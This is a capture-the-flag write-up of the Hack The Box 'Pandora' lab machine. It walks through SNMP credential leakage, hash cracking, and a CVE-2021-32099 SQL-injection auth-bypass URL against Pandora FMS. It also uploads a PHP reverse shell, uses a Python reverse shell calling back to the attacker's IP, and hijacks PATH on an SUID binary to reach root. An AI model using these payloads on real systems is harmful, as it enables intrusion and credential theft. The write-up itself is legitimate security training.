---
layout: single
title: Pandora - Hack The Box
excerpt: "Pandora is an easy-rated Linux machine from Hack The Box. On this machine we're forced to think outside of the box, or even inside to be precise. We get a foothold almost instantly and from there need to enumerate the local services and use tunneling to exploit them, which I find unique for an easy-rated machine. The $PATH to root has a nice little quirk that took me off guard, and in the end forced me to learn something valuable that I'll take with me for future assessments. Was it fun though? Yes and no, it was decent and will keep you busy for a few hours."
date: 2022-01-31
classes: wide
header:
  teaser: /assets/images/htb-writeup-pandora/pandora_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - easy
  - snmp
  - tunneling
  - suid
  - path
  - apache sandbox
---

![](/assets/images/htb-writeup-pandora/pandora_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

Pandora is an easy-rated Linux machine from Hack The Box. On this machine we're forced to think outside of the box, or even inside to be precise. We get a foothold almost instantly and from there need to enumerate the local services and use tunneling to exploit them, which I find unique for an easy-rated machine. The $PATH to root has a nice little quirk that took me off guard, and in the end forced me to learn something valuable that I'll take with me for future assessments. Was it fun though? Yes and no, it was decent and will keep you busy for a few hours.
<br>

----------------

# USER

### Step 1

**nmap:**
```bash
[root:/git/htb/pandora]# nmap -p- 10.10.11.136
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

[root:/git/htb/pandora]# nmap -Pn -n -sCV -p22,80 10.10.11.136
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

[root:/git/htb/pandora]# nmap -sU --top-port=20 --open 10.10.11.136
PORT     STATE         SERVICE
67/udp   open|filtered dhcps
68/udp   open|filtered dhcpc
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open          snmp
520/udp  open|filtered route
4500/udp open|filtered nat-t-ike
```

**dirb:**
```bash
==> DIRECTORY: http://10.10.11.136/assets/                                                                                                   
+ http://10.10.11.136/index.html (CODE:200|SIZE:33560)                                                                                       
+ http://10.10.11.136/server-status (CODE:403|SIZE:277)
```

**nikto:**
```bash
+ Server: Apache/2.4.41 (Ubuntu)
```

**snmp-check:**
```bash
[root:/git/htb/pandora]# snmp-check 10.10.11.136

[... snip ...]

[+] Try to connect to 10.10.11.136:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.136
  Hostname                      : pandora
  Description                   : Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
  Contact                       : Daniel

[... snip ...]

[*] Processes:

  846                   runnable              sh                    /bin/sh               -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
  1118                  runnable              host_check            /usr/bin/host_check   -u daniel -p HotelBabylon23
```

Found credentials: `daniel:HotelBabylon23`

-----------

### Step 2

Login with SSH and the found credentials and begin enumerate the box internally. Keep in mind that we could see on the webserver `/assets/scss` that there are probably a **blog** and **login** page, these could be used as potential escalation vectors.

```bash
daniel@pandora:/var/www/pandora/pandora_console$ cat * | grep -i admin

[... snip ...]

INSERT INTO `tusuario` (`id_user`, `fullname`, `firstname`, `lastname`, `middlename`, `password`, `comments`, `last_connect`, `registered`, `email`, `phone`, `is_admin`, `language`, `block_size`, `section`, `data_section`, `metaconsole_access`) VALUES
('admin', 'Pandora', 'Pandora', 'Admin', '', '1da7ee7d45b96d0e1f45ee4ee23da560', 'Admin Pandora', 1232642121, 0, 'admin@example.com', '555-555-5555', 1, 'default', 0, 'Default', '', 'advanced');

[root:/git/htb/pandora]# hashcat -a0 -m0 passwd.hash /usr/share/wordlists/rockyou.txt
1da7ee7d45b96d0e1f45ee4ee23da560:pandora                  
                                       
Session..........: hashcat
Status...........: Cracked
```

Setup a SSH Tunnel to access the internal webserver, try cracked credentials `admin:pandora` to login.
```bash
[root:/git/htb/pandora]# ssh -L 80:localhost:80 daniel@pandora.htb
```

![](/assets/images/htb-writeup-pandora/pandora01.png)

Unfortunatley the login fails. 

On the bottom of the page we find version **v7.0NG.742_FIX_PERL2020**, using searchsploit we find three interesting exploits - however all three are authenticated.
```bash
[root:/git/htb/pandora]# searchsploit pandora
Pandora 7.0NG - Remote Code Execution                                                                       | php/webapps/47898.py
Pandora FMS 7.0NG - 'net_tools.php' Remote Code Execution                                                   | php/webapps/48280.py
PANDORAFMS 7.0 - Authenticated Remote Code Execution                                                        | php/webapps/48064.py
```

-----------

### Step 3
Googling `Pandora FMS 742 Auth Bypass` we find [this post](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained). There is a SQL Injection vulnerability in **chart_generator.php** leading to an authentication bypass - perfect! 

```bash
[root:/git/htb/pandora]# sqlmap -u http://localhost/pandora_console/include/chart_generator.php\?session_id\=1 --dbms=mysql -D pandora --dump
[... snip ...]
[16:01:22] [INFO] retrieved: 'tpassword_history'

[root:/git/htb/pandora]# sqlmap -u http://localhost/pandora_console/include/chart_generator.php\?session_id\=1 --dbms=mysql -D pandora -T tpassword_history --dump
Database: pandora
Table: tpassword_history
[2 entries]
+---------+---------+---------------------+----------------------------------+---------------------+
| id_pass | id_user | date_end            | password                         | date_begin          |
+---------+---------+---------------------+----------------------------------+---------------------+
| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
+---------+---------+---------------------+----------------------------------+---------------------+
```

I am not able to crack the password for matt however. Googling around for **CVE-2021-32099** poc I come across this [one-liner](https://sploitus.com/exploit?id=64F47C34-B920-525E-80F3-B416C84DA936). 

Change it to fit our needs, visit the URL, update the login promt and we've bypassed the login as admin.
```bash
http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
```

![](/assets/images/htb-writeup-pandora/pandora02.png)

Go to Admin tools > File manager > Upload file (top right corner), and upload a **php reverse shell**.
Trigger the reverse by visiting `http://localhost/pandora_console/images/rev.php`.

```bash
[root:/git/htb/pandora]# nc -lvnp 4488                                                                                             (master✱) 
listening on [any] 4488 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.136] 49484
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 14:24:05 up  4:32,  3 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
daniel   pts/0    10.10.14.6       09:53    1:33m  6:12   0.92s -bash
daniel   pts/1    10.10.14.11      12:57   41:33   0.28s  0.28s -bash
daniel   pts/2    10.10.14.11      13:19    1:04m  0.03s  0.03s -bash
uid=1000(matt) gid=1000(matt) groups=1000(matt)
/bin/sh: 0: cant access tty; job control turned off
$ hostname && id
pandora
uid=1000(matt) gid=1000(matt) groups=1000(matt)
$ cat /home/matt/user.txt
a1d9ef4581130dd7dc6852315d356945
```


--------------

# ROOT

### Step 1 
Trying the usual `sudo -l` fails, so enumerate the box manually and/or with linpeas.

```bash
matt@pandora:/dev/shm$ ./linpeas.sh 

[... snip ...]
-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup (Unknown SUID binary)
```

Trying to execute the binary fails:
```bash
matt@pandora:/dev/shm$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
Check your permissions!
```

It seems like the program want's to use `tar` on `/root/.backup/pandora-backup.tar.gz`. Since this is an easy box, maybe this is exploitable using `$PATH`. 

Find where `tar` is located:
```bash
matt@pandora:/$ which tar
/usr/bin/tar

OR

matt@pandora:/$ find / -name "tar" -type f 2>&1 | grep -v "Permission denied"
/usr/bin/tar
```

Create a malicious tar-file to be executed:
```bash
matt@pandora:/dev/shm$ cat tar 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",4499));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
matt@pandora:/dev/shm$ chmod +x tar
```

**NOTE:** It would probably suffice just having `/bin/bash` in the malicious tar-binary.

Change the PATH and run `pandora_backup` to trigger the reverse shell. 

```bash
matt@pandora:/dev/shm$ export PATH=/dev/shm:$PATH
matt@pandora:/dev/shm$ sudo /usr/bin/pandora_backup 
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```

Executing the binary without `sudo` just gives us a shell as matt again. Something is weird with the suid bit.

-----------

### Step 2
Trying to understand why we get `Operation not permitted` when running commands as sudo, I came across a [writeup of OpenAdmin](https://sabebarker.com/writeups/hackthebox/machines/openadmin/) where the writer experienced the same issue. To solve it he generated a new key pair and logged in via ssh. 

To understand exactly why this was an issue, I spoke with the box creator after completing this box and got this explanation:

> *".. its due to apache's mpm_itk module, it sandboxes the namespace and disables SUID as a form of protection when running apache as another user - [https://lists.debian.org/debian-apache/2015/11/msg00022.html](https://lists.debian.org/debian-apache/2015/11/msg00022.html "https://lists.debian.org/debian-apache/2015/11/msg00022.html")"*

```bash
[root:/git/htb/pandora]# ssh-keygen -t rsa -b 4096 -f matt-id_rsa
[root:/git/htb/pandora]# cat matt-id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC2WZVQuP8WGh3bumMoXGRiVzxWLBWZDR7x1cKfIk59S1ZL8RJcw3jxxOeJ8McF5Bjvet/xtCm9kPbEsIybA2HCK5+H77d+R97x7Yr3bvWd+OzB0Xvw/jsKlDHgiYBQAFKNZAwBKfHu7CCBn/VhsnCmXDizkH3UzvaB638vFlE+aWruHS4Gqge+hWBGkVxVIDeHjb1hNrmUz/QuTivuySqvsTg1B6IONWvS//+jCLsEteyV5aef24agwDVHAM15ILfLGxYRVKh5AjnZuSt090Sy+9ehapJUo2DBTvC8KJjY5pDZ68mFyCxEHRPaicM97ZUsQxAjSGpHoLlvVw9eNbPPYZHOIUs0bc8a50hAK56Gq2MgMOerNe+T0g3/HxMVZdKDwOaVOi2J/PuYTOy9tZkIZKyRiEsZIBFA4w1Mwjp0GIa4hZ1lnPpLsCrG/iFB2xhhfSg46SswAGk38bEFI8a1pnQxqBf+NCVmBil7A4j2ktuMmcLRWBOChBrUb01s348Hf+yNDBuYr7U4QyRz4xBQHg6jV7ZkyBh2vcEBy3YlWYq4YN7Cc2a4cExKX8n0NxBv5C23rhmjg/DEZiGR47jrXGtmGJhMgwJjjqW5vqXqjcYOn778eZ3GpRDML/BmRjGAxPL4aIqju/MD9z66eET79Jam1wzMw4bwWGH81XZAZw==

matt@pandora:/dev/shm$ mkdir /home/matt/.ssh
matt@pandora:/dev/shm$ chmod 700 /home/matt/.ssh/
matt@pandora:/dev/shm$ vim /home/matt/.ssh/authorized_keys
matt@pandora:/dev/shm$ chmod 600 /home/matt/.ssh/authorized_keys
matt@pandora:/dev/shm$ ls -al /home/matt/.ssh/
total 12
drwxrwxrwx 2 matt matt 4096 Jan 26 16:29 .
drwxr-xr-x 4 matt matt 4096 Jan 26 16:28 ..
-rw------- 1 matt matt  725 Jan 26 16:29 authorized_keys

[root:/git/htb/pandora]# ssh matt@pandora.htb -i matt-id_rsa
matt@pandora:~$
```

Now, retrace our steps and change the `$PATH` and run our malicious `tar` to get root shell.

```bash
matt@pandora:/dev/shm$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:/dev/shm$ export PATH=/dev/shm:$PATH
matt@pandora:/dev/shm$ cat tar 
/bin/bash
matt@pandora:/dev/shm$ /usr/bin/pandora_backup 
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/dev/shm# id
uid=0(root) gid=1000(matt) groups=1000(matt)

root@pandora:/dev/shm# cat /root/root.txt
b7604e0c75f6b75c43f2f0a3de0e9b31

root@pandora:/dev/shm# cat /etc/shadow
root:$6$HM2preufywiCDqbY$XPrZFWf6w08MKkjghhCPBkxUo2Ag5xvZYOh4iD4XcN4zOVbWsdvqLYbznbUlLFxtC/.Z0oe9
matt:$6$JYpB9KogYA60PG6X$dU7jHpb3MIYYg0evztbE8Xw8dx7ok5/U0PaDT63FgQTwyJFr9DbaLa0WzeZGMFd05hrNCnoP
daniel:$6$f4POti4xJyVf3/yD$7/efpNYDq.baYycVczUb4b5LlEBNami3//4TbI6lPNK2MaWPrqbdvAhLdMrfHnnZATY59rLgr4DeEZ3U8S41l/:18964:0:99999:7:::
```

------

# References
**Pandora FMS 742 Auth Bypass:**
- [Reference #1 - pandora vuln explained](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)
- [Reference #2 - sqlpwn.py](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py)